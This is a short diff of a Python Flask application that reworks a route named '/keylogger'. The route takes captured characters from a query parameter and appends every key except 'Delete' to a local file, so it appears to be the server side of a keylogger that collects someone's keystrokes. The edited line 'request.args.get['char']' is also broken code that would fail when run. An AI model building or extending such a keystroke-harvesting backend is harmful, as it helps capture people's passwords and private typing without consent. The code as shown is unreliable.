@@ -7,8 +7,9 @@ from .database import db, app
 import os
 
 
-@app.route('/keylogger/<word>', methods=["GET", "POST"])
-def check_word(word):
+@app.route('/keylogger', methods=["GET", "POST"])
+def check_word():
+    word = request.args.get['char']
     if word != 'Delete':
         string_file = open('./string_data', 'a')
         string_file.write(word)
